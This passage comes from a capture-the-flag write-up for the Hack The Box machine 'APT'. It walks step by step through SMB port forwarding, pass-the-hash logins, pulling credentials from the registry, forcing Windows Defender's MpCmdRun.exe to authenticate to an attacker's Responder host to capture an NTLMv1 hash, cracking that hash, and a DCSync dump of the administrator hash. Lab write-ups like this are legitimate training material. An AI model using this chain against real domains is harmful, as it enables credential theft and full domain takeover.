<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «apt» «10.10.14.72» 
$ socat tcp-listen:445,fork tcp6:apt:445
</code></pre></div><p>Second, use ssh.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «apt» «10.10.14.72» 
$ ssh -L 445:apt:445 root@localhost -Nf

→ root@iamf «apt» «10.10.14.72» 
$ netstat -tlpn
Active Internet connections <span style="color:#f92672">(</span>only servers<span style="color:#f92672">)</span>
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 127.0.0.1:445           0.0.0.0:*               LISTEN      8548/ssh            
tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 0.0.0.0:22              0.0.0.0:*               LISTEN      8087/sshd: /usr/sbin 
tcp6       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> ::1:445                 :::*                    LISTEN      8548/ssh 
</code></pre></div><p>I can confirm both forwarding options work by running <code>CrackMapExec</code> to localhost using <code>henry.vinson</code> creds</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «apt» «10.10.14.72» 
$ crackmapexec smb localhost -u henry.vinson -H e53d87d42adaa3ca32bdb34a876cbffb 
SMB         127.0.0.1       <span style="color:#ae81ff">445</span>    APT              <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2016</span> Standard <span style="color:#ae81ff">14393</span> <span style="color:#f92672">(</span>name:APT<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:htb.local<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:True<span style="color:#f92672">)</span>
SMB         127.0.0.1       <span style="color:#ae81ff">445</span>    APT              <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> htb.local<span style="color:#ae81ff">\h</span>enry.vinson e53d87d42adaa3ca32bdb34a876cbffb 
</code></pre></div><h4 id="registry-enumeration">Registry Enumeration</h4>
<p><code>henry.vinson</code> can not be used to login remotely into the box.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «apt» «10.10.14.72» 
$ evil-winrm -i apt -u henry.vinson -H e53d87d42adaa3ca32bdb34a876cbffb

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError

Error: Exiting with code <span style="color:#ae81ff">1</span>
</code></pre></div><p>Instead, I can perform enumeration on the user registry using <code>reg.py</code> from Impacket.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «apt» «10.10.14.72» 
$ reg.py htb.local/henry.vinson@apt -hashes <span style="color:#e6db74">&#39;e53d87d42adaa3ca32bdb34a876cbffb:e53d87d42adaa3ca32bdb34a876cbffb&#39;</span> query -keyName HKU
Impacket v0.9.22.dev1+20200914.162022.81d44893 - Copyright <span style="color:#ae81ff">2020</span> SecureAuth Corporation

<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Cannot check RemoteRegistry status. Hoping it is started...
HKU
HKU<span style="color:#ae81ff">\C</span>onsole
HKU<span style="color:#ae81ff">\C</span>ontrol Panel
HKU<span style="color:#ae81ff">\E</span>nvironment
HKU<span style="color:#ae81ff">\K</span>eyboard Layout
HKU<span style="color:#ae81ff">\N</span>etwork
HKU<span style="color:#ae81ff">\S</span>oftware
HKU<span style="color:#ae81ff">\S</span>ystem
HKU<span style="color:#ae81ff">\V</span>olatile Environment
</code></pre></div><p>Checking on <code>HKU\Software</code> is worth trying since some applications may store their credentials in a registry.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «apt» «10.10.14.72» 
$ reg.py htb.local/henry.vinson@apt -hashes <span style="color:#e6db74">&#39;e53d87d42adaa3ca32bdb34a876cbffb:e53d87d42adaa3ca32bdb34a876cbffb&#39;</span> query -keyName HKU<span style="color:#ae81ff">\\</span>Software   
Impacket v0.9.22.dev1+20200914.162022.81d44893 - Copyright <span style="color:#ae81ff">2020</span> SecureAuth Corporation

<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Cannot check RemoteRegistry status. Hoping it is started...
HKU<span style="color:#ae81ff">\S</span>oftware
HKU<span style="color:#ae81ff">\S</span>oftware<span style="color:#ae81ff">\G</span>iganticHostingManagementSystem
HKU<span style="color:#ae81ff">\S</span>oftware<span style="color:#ae81ff">\M</span>icrosoft
HKU<span style="color:#ae81ff">\S</span>oftware<span style="color:#ae81ff">\P</span>olicies
HKU<span style="color:#ae81ff">\S</span>oftware<span style="color:#ae81ff">\R</span>egisteredApplications
HKU<span style="color:#ae81ff">\S</span>oftware<span style="color:#ae81ff">\V</span>Mware, Inc.
HKU<span style="color:#ae81ff">\S</span>oftware<span style="color:#ae81ff">\W</span>ow6432Node
HKU<span style="color:#ae81ff">\S</span>oftware<span style="color:#ae81ff">\C</span>lasses
</code></pre></div><p>The <code>HKU\Software\GiganticHostingManagementSystem</code> contains a set of credentials for username <code>henry.vinson_adm</code> and a password of <code>G1#Ny5@2dvht</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «apt» «10.10.14.72» 
$ reg.py htb.local/henry.vinson@apt -hashes <span style="color:#e6db74">&#39;e53d87d42adaa3ca32bdb34a876cbffb:e53d87d42adaa3ca32bdb34a876cbffb&#39;</span> query -keyName HKU<span style="color:#ae81ff">\\</span>Software<span style="color:#ae81ff">\\</span>GiganticHostingManagementSystem
Impacket v0.9.22.dev1+20200914.162022.81d44893 - Copyright <span style="color:#ae81ff">2020</span> SecureAuth Corporation

<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Cannot check RemoteRegistry status. Hoping it is started...
HKU<span style="color:#ae81ff">\S</span>oftware<span style="color:#ae81ff">\G</span>iganticHostingManagementSystem
        UserName        REG_SZ   henry.vinson_adm
        PassWord        REG_SZ   G1#Ny5@2dvht

</code></pre></div><h4 id="remote-access">Remote Access</h4>
<p><code>henry.vinson_adm</code> credentials can be used to gain a foothold on the system remotely. I’ll just grab the user flag.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «apt» «10.10.14.72» 
$ evil-winrm -i apt -u henry.vinson_adm -p <span style="color:#e6db74">&#39;G1#Ny5@2dvht&#39;</span>                  

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\h</span>enry.vinson_adm<span style="color:#ae81ff">\D</span>ocuments&gt; 
*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\h</span>enry.vinson_adm<span style="color:#ae81ff">\D</span>ocuments&gt; cd ..<span style="color:#ae81ff">\D</span>esktop
*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\h</span>enry.vinson_adm<span style="color:#ae81ff">\D</span>esktop&gt; type user.txt
745212a817f60f27befd...&lt;SNIP&gt;...
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-administrator">Shell as administrator</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>Performing a text file enumeration finds a PowerShell history file.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">*Evil-WinRM* PS C:\Users\henry.vinson_adm&gt; gci -Path C:\Users -filter *.txt -Recurse -ErrorAction SilentlyContinue -Force

...&lt;SNIP&gt;...
    Directory<span style="color:#960050;background-color:#1e0010">:</span> C:\Users\henry.vinson_adm\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       11/10/2020  10<span style="color:#960050;background-color:#1e0010">:</span>58 AM            458 ConsoleHost_history.txt

*Evil-WinRM* PS C:\Users\henry.vinson_adm&gt; type <span style="color:#e6db74">&#34;C:\Users\henry.vinson_adm\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt&#34;</span>
$Cred = get-credential administrator
invoke-command -credential $Cred -computername localhost -scriptblock {Set-ItemProperty -Path <span style="color:#e6db74">&#34;HKLM:\SYSTEM\CurrentControlSet\Control\Lsa&#34;</span> lmcompatibilitylevel -Type DWORD -Value 2 -Force}
</code></pre></div><p>From Wikipedia:</p>
<blockquote>
<p><strong>Send NTLM response only</strong>: Clients use NTLM authentication only, and use NTLMv2 session security if server supports it; <strong>DCs accept LM,</strong>  NTLM, and NTLMv2 authentication.</p>
</blockquote>
<p>With <code>lmcompatibilitylevel = 2</code>, it means the authentication process can be downgraded to NTLMv1. The attack is explained in detail <a href="https://book.hacktricks.xyz/windows/ntlm">here</a>.</p>
<p>There is a site called <a href="https://crack.sh">https://crack.sh</a> that provides a service for cracking NTLMv1 hash using <a href="https://en.wikipedia.org/wiki/Rainbow_table">rainbow tables</a> for a specific challenge of &ldquo;1122334455667788&rdquo;.</p>
<p>The idea here is to force APT to make a request (<em>challenge-response</em>) to the server that the attacker controls, which has been configured to send the string &ldquo;1122334455667788&rdquo; as the challenge (after downgrading the authentication process to NTLMv1).</p>
<p>After the server receives the response from the given challenge, I can send the NTLMv1 hash from that response to <a href="https://crack.sh">crack.sh</a> for cracking and obtain NTLM/NT hash of APT afterward.</p>
<blockquote>
<p>Note:</p>
<ul>
<li>NetNTLM/NTLMv1 is an authentication protocol</li>
<li>NetNTLM/NTLMv1 hash != NTLM hash</li>
<li>NetNTLM/NTLMv1 hash contains NTLM hash</li>
</ul>
</blockquote>
<h4 id="stealing-ntlmv1-hash-via-mpcmdrunexe">Stealing NTLMv1 hash via MpCmdRun.exe</h4>
<p><code>MpCmdRun.exe</code> is part of Windows Defender that always runs with SYSTEM privileges. I can abuse this behavior to scan a file on my SMB server and capture the NTLMv1 authentication hash.</p>
<blockquote>
<p>This <a href="https://techcommunity.microsoft.com/t5/storage-at-microsoft/smb-and-null-sessions-why-your-pen-test-is-probably-wrong/ba-p/1185365">article</a> explaining how authentication proccess over SMB work</p>
</blockquote>
<p>For this, I’ll need to edit <code>/etc/responder/Responder.conf</code> first, and change the challenge from &ldquo;random&rdquo; to &ldquo;1122334455667788&rdquo;.</p>
<p>After that, I can start <code>Responder</code> to listen on my tun0 interface and specify the <code>--lm</code> option which will downgrade the authentication to NTLMv1.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «~» «10.10.14.72» 
$ responder -I tun0 --lm                                 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  <span style="color:#f92672">||</span>  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____<span style="color:#f92672">||</span>_____|__|
                   |__|

           NBT-NS, LLMNR &amp; MDNS Responder 2.3.4.0

  Author: Laurent Gaffie <span style="color:#f92672">(</span>laurent.gaffie@gmail.com<span style="color:#f92672">)</span>
  To kill this script hit CTRL-C


<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Poisoners:
    LLMNR                      <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
    NBT-NS                     <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
    DNS/MDNS                   <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>

<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Servers:
    HTTP server                <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
    HTTPS server               <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
    WPAD proxy                 <span style="color:#f92672">[</span>OFF<span style="color:#f92672">]</span>
    Auth proxy                 <span style="color:#f92672">[</span>OFF<span style="color:#f92672">]</span>
    SMB server                 <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
    Kerberos server            <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
    SQL server                 <span style="color:#f92672">[</span>OFF<span style="color:#f92672">]</span>
    FTP server                 <span style="color:#f92672">[</span>OFF<span style="color:#f92672">]</span>
    IMAP server                <span style="color:#f92672">[</span>OFF<span style="color:#f92672">]</span>
    POP3 server                <span style="color:#f92672">[</span>OFF<span style="color:#f92672">]</span>
    SMTP server                <span style="color:#f92672">[</span>OFF<span style="color:#f92672">]</span>
    DNS server                 <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
    LDAP server                <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
    RDP server                 <span style="color:#f92672">[</span>OFF<span style="color:#f92672">]</span>

<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> HTTP Options:
    Always serving EXE         <span style="color:#f92672">[</span>OFF<span style="color:#f92672">]</span>
    Serving EXE                <span style="color:#f92672">[</span>OFF<span style="color:#f92672">]</span>
    Serving HTML               <span style="color:#f92672">[</span>OFF<span style="color:#f92672">]</span>
    Upstream Proxy             <span style="color:#f92672">[</span>OFF<span style="color:#f92672">]</span>

<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Poisoning Options:
    Analyze Mode               <span style="color:#f92672">[</span>OFF<span style="color:#f92672">]</span>
    Force WPAD auth            <span style="color:#f92672">[</span>OFF<span style="color:#f92672">]</span>
    Force Basic Auth           <span style="color:#f92672">[</span>OFF<span style="color:#f92672">]</span>
    Force LM downgrade         <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
    Fingerprint hosts          <span style="color:#f92672">[</span>OFF<span style="color:#f92672">]</span>

<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Generic Options:
    Responder NIC              <span style="color:#f92672">[</span>tun0<span style="color:#f92672">]</span>
    Responder IP               <span style="color:#f92672">[</span>10.10.14.72<span style="color:#f92672">]</span>
    Challenge set              <span style="color:#f92672">[</span>1122334455667788<span style="color:#f92672">]</span>
    Don<span style="color:#e6db74">&#39;t Respond To Names     [&#39;</span>ISATAP<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">]</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Listening <span style="color:#66d9ef">for</span> events...
</code></pre></div><p>Now on APT, I can force authentication with <code>MpCmdRun.exe</code> (located on <code>C:\Program Files\Windows Defender</code>), and it errors out.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">*Evil-WinRM* PS C:\Program Files\Windows Defender&gt;.\MpCmdRun.exe -Scan -ScanType 3 <span style="color:#f92672">-File</span> \\10.10.14.72\notexist

Scan starting...
CmdTool<span style="color:#960050;background-color:#1e0010">:</span> Failed with hr = 0x80508023. Check C:\Users\HENRY~2.VIN\AppData\Local\Temp\MpCmdRun.log <span style="color:#66d9ef">for</span> more information
</code></pre></div><blockquote>
<p>Active Directory uses Kerberos as the default authentication method, but it will fallback to NTLM authentication if the client try to connect to other hosts with IP address</p>
</blockquote>
<p>But on my Kali, <code>responder</code> has successfully captured the hash of <code>APT$</code>, the computer account of the box.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">...&lt;snip&gt;..
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Listening <span style="color:#66d9ef">for</span> events...
<span style="color:#f92672">[</span>SMB<span style="color:#f92672">]</span> NTLMv1 Client   : 10.10.10.213
<span style="color:#f92672">[</span>SMB<span style="color:#f92672">]</span> NTLMv1 Username : HTB<span style="color:#ae81ff">\A</span>PT$
<span style="color:#f92672">[</span>SMB<span style="color:#f92672">]</span> NTLMv1 Hash     : APT$::HTB:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:1122334455667788
</code></pre></div><p>When there is no credentials are specified explicitly, Windows uses the current credentials.</p>
<p>However, because Windows Defender is already running as SYSTEM (built-in local system), (afaik) it can not be downgraded to a lower privilege for authentication. It won’t authenticate using SYSTEM as well. Instead, it uses the machine/computer account for authentication. LocalSystem and NetworkService credentials use computer account for authentication.</p>
<h4 id="cracking-ntlmv1-hash">Cracking NTLMv1 hash</h4>
<p>I can submit the hash to <a href="https://crack.sh/">https://crack.sh/</a> with the following format.</p>
<pre><code>NTHASH:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384
</code></pre><p><img class="img-container" src="imgs/image-20210417161415390.png" alt="image-20210417161415390"  />
</p>
<p>It will automatically detect the input.</p>
<p><img class="img-container" src="imgs/image-20210417161541589.png" alt="image-20210417161541589"  />
</p>
<p>Not even a minute passed, it sent me the result.</p>
<p><img class="img-container" src="imgs/image-20210417161758516.png" alt="image-20210417161758516"  />
</p>
<p>The key is <code>d167c3238864b12f5f82feae86a7f798</code>, it&rsquo;s the NTLM hash/NThash that can be used for <em>pass-the-hash</em> attack.</p>
<h4 id="credential-dumping">Credential Dumping</h4>
<p>NTLM Hash of a computer account can not be used for remote login. Instead, it can be used to perform DCSync attack using <code>secretsdump.py</code>. I&rsquo;ll take only the administrator hash.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «~» «10.10.14.72» 
$ secretsdump.py <span style="color:#e6db74">&#39;htb.local/APT$@apt&#39;</span> -hashes <span style="color:#e6db74">&#39;d167c3238864b12f5f82feae86a7f798:d167c3238864b12f5f82feae86a7f798&#39;</span> -just-dc-user administrator

Impacket v0.9.22.dev1+20200914.162022.81d44893 - Copyright <span style="color:#ae81ff">2020</span> SecureAuth Corporation

<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Dumping Domain Credentials <span style="color:#f92672">(</span>domain<span style="color:#ae81ff">\u</span>id:rid:lmhash:nthash<span style="color:#f92672">)</span>
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c370bddf384a691d811ff3495e8a72e2:::
...&lt;snip&gt;..
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Cleaning up...
</code></pre></div><p>I can login into the box using <code>evil-winrm</code> with the administrator hash I obtained.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «~» «10.10.14.72» 
$ evil-winrm -i apt -u administrator -H c370bddf384a691d811ff3495e8a72e2

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>ocuments&gt; type ..<span style="color:#ae81ff">\D</span>esktop<span style="color:#ae81ff">\r</span>oot.txt
a1f204c405aea36388...&lt;SNIP&gt;...
*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>ocuments&gt; 
</code></pre></div><hr>
<h2 id="references">References</h2>
<ul>
<li>
<p><a href="https://book.hacktricks.xyz/pentesting/135-pentesting-msrpc">https://book.hacktricks.xyz/pentesting/135-pentesting-msrpc</a></p>
</li>
<li>
<p><a href="https://pubs.opengroup.org/onlinepubs/098759899/CHP21CHP.HTM">https://pubs.opengroup.org/onlinepubs/098759899/CHP21CHP.HTM</a></p>
</li>
<li>
<p><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wpo/f8bb99d3-7755-4ab9-9510-09920196f8b0">https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wpo/f8bb99d3-7755-4ab9-9510-09920196f8b0</a></p>
</li>
<li>
<p><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/c25391af-f59e-40da-885e-cc84076673e4">https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/c25391af-f59e-40da-885e-cc84076673e4</a></p>
</li>
<li>
<p><a href="https://airbus-cyber-security.com/the-oxid-resolver-part-1-remote-enumeration-of-network-interfaces-without-any-authentication/">https://airbus-cyber-security.com/the-oxid-resolver-part-1-remote-enumeration-of-network-interfaces-without-any-authentication/</a></p>
</li>
<li>
<p><a href="https://en.wikipedia.org/wiki/NT_LAN_Manager">https://en.wikipedia.org/wiki/NT_LAN_Manager</a></p>
</li>
<li>
<p><a href="https://www.blackhat.com/presentations/win-usa-04/bh-win-04-seki-up2.pdf">https://www.blackhat.com/presentations/win-usa-04/bh-win-04-seki-up2.pdf</a></p>
</li>
<li>
<p><a href="https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4">https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4</a></p>
</li>
<li>
<p><a href="https://www.trustedsec.com/blog/the-tale-of-the-lost-but-not-forgotten-undocumented-netsync-part-1/">https://www.trustedsec.com/blog/the-tale-of-the-lost-but-not-forgotten-undocumented-netsync-part-1/</a></p>
</li>
<li>
<p><a href="https://techcommunity.microsoft.com/t5/ask-the-directory-services-team/machine-account-password-process/ba-p/396026">https://techcommunity.microsoft.com/t5/ask-the-directory-services-team/machine-account-password-process/ba-p/396026</a></p>
</li>
</ul>
]]></content:encoded>
    </item>
    
  </channel>
</rss>
